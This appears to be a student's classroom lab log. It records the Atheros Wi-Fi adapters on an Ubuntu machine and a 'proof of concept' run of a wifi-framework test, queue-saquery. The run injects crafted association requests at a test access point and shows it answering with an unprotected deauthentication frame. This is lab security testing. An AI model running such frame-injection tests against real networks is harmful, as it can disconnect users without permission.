OS: Ubuntu 22.04.5 LTS
Wireless card:
05:00.0 Network controller: Qualcomm Atheros AR9287 Wireless Network Adapter (PCI-Express) (rev 01)
06:00.0 Network controller: Qualcomm Atheros AR93xx Wireless Network Adapter (rev 01)
Drivers: 
*-network
       description: Wireless interface
       product: AR9287 Wireless Network Adapter (PCI-Express)
       vendor: Qualcomm Atheros
       physical id: 0
       bus info: pci@0000:05:00.0
       logical name: wlp5s0
       version: 01
       serial: 30:b5:c2:67:a4:32
       width: 64 bits
       clock: 33MHz
       capabilities: pm msi pciexpress bus_master cap_list ethernet physical wireless
       configuration: broadcast=yes driver=ath9k driverversion=6.8.0-45-generic firmware=N/A latency=0 link=no multicast=yes wireless=IEEE 802.11
       resources: irq:18 memory:f7d00000-f7d0ffff
  *-network
       description: Wireless interface
       product: AR93xx Wireless Network Adapter
       vendor: Qualcomm Atheros
       physical id: 0
       bus info: pci@0000:06:00.0
       logical name: wlp6s0
       version: 01
       serial: e8:de:27:13:0f:13
       width: 64 bits
       clock: 33MHz
       capabilities: pm msi pciexpress bus_master cap_list rom ethernet physical wireless
       configuration: broadcast=yes driver=ath9k driverversion=6.8.0-45-generic firmware=N/A latency=0 link=no multicast=yes wireless=IEEE 802.11
       resources: irq:19 memory:f7c00000-f7c1ffff memory:f7c20000-f7c2ffff

iw wlp5s0 info :
(base) student@ubuntu:~/Desktop$ iw wlp5s0 info
Interface wlp5s0
	ifindex 3
	wdev 0x1
	addr 30:b5:c2:67:a4:32
	type AP
	wiphy 0
	txpower 16.00 dBm
	multicast TXQ:
		qsz-byt	qsz-pkt	flows	drops	marks	overlmt	hashcol	tx-bytes	tx-packets
		0	0	73	0	0	0	0	10108		73

iw wlp6s0 info :
Interface wlp6s0
	ifindex 4
	wdev 0x100000001
	addr e8:de:27:13:0f:13
	type managed
	wiphy 1
	txpower 16.00 dBm
	multicast TXQ:
		qsz-byt	qsz-pkt	flows	drops	marks	overlmt	hashcol	tx-bytes	tx-packets
		0	0	0	0	0	0	0	0		0


Prove of concept(PC z sali atakujacy na pc Maćka) : 
(base) student@ubuntu:~/Desktop/wifi-framework$ sudo ./run.py wlp6s0 queue-saquery
[10:17:41] Using interface monwlp6s0 (ath9k) to inject frames.
[10:17:41] Starting daemon using: ./dependencies/hostap_2_10/wpa_supplicant/wpa_supplicant -Dnl80211 -i wlp6s0 -c ./setup/supplicant.conf -W -K
Successfully initialized wpa_supplicant
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
wlp6s0: SME: Trying to authenticate with a0:51:0b:65:8e:70 (SSID='testnetwork' freq=2412 MHz)
wlp6s0: SME: Trying to authenticate with a0:51:0b:65:8e:70 (SSID='testnetwork' freq=2412 MHz)
wlp6s0: PMKSA-CACHE-ADDED a0:51:0b:65:8e:70 0
wlp6s0: Trying to associate with a0:51:0b:65:8e:70 (SSID='testnetwork' freq=2412 MHz)
wlp6s0: Associated with a0:51:0b:65:8e:70
wlp6s0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlp6s0: WPA: Key negotiation completed with a0:51:0b:65:8e:70 [PTK=CCMP GTK=CCMP]
wlp6s0: CTRL-EVENT-CONNECTED - Connection to a0:51:0b:65:8e:70 completed [id=0 id_str=]
[10:17:43] Loaded pairwise and group encryption keys.
[10:17:43] Trigger = Connected.
[10:17:43] Generating queue-saquery test case.
[10:17:44] Injected <Dot11  subtype=Association Request type=Management FCfield=pw-mgt addr1=a0:51:0b:65:8e:70 (RA=DA) addr2=e8:de:27:13:0f:13 (TA=SA) addr3=a0:51:0b:65:8e:70 (BSSID/STA) |<Dot11AssoReq  |<Dot11Elt  ID=SSID info=b'testnetwork' |<Dot11Elt  ID=Supported Rates info=b'\x02\x04\x0b\x16\x0c\x12\x18$' |<Dot11Elt  ID=Extended Supported Rates info=b'0H`l' |<Raw  load=b'0\x1a\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x08\xc0\x00\x00\x00\x00\x0f\xac\x06' |>>>>>>
[10:17:46] Injected <Dot11  subtype=Association Request type=Management addr1=a0:51:0b:65:8e:70 (RA=DA) addr2=e8:de:27:13:0f:13 (TA=SA) addr3=a0:51:0b:65:8e:70 (BSSID/STA) |<Dot11AssoReq  |<Dot11Elt  ID=SSID info=b'testnetwork' |<Dot11Elt  ID=Supported Rates info=b'\x02\x04\x0b\x16\x0c\x12\x18$' |<Dot11Elt  ID=Extended Supported Rates info=b'0H`l' |<Raw  load=b'0\x1a\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x08\xc0\x00\x00\x00\x00\x0f\xac\x06' |>>>>>>
[10:17:50] 802.11 Management Deauthentication a0:51:0b:65:8e:70 (TA=SA) > e8:de:27:13:0f:13 (RA=DA) / Dot11Deauth
[10:17:50] Detected an unprotected deauthentication frame from AP.
[10:17:50] Trigger = Received.
[10:17:52] Disconnecting.
[10:17:52] Closing daemon and cleaning up ...
wlp6s0: CTRL-EVENT-DISCONNECTED bssid=a0:51:0b:65:8e:70 reason=3 locally_generated=1
wlp6s0: CTRL-EVENT-DSCP-POLICY clear_all
wlp6s0: PMKSA-CACHE-REMOVED a0:51:0b:65:8e:70 0
wlp6s0: CTRL-EVENT-DSCP-POLICY clear_all
nl80211: deinit ifname=wlp6s0 disabled_11b_rates=0
wlp6s0: CTRL-EVENT-TERMINATING 
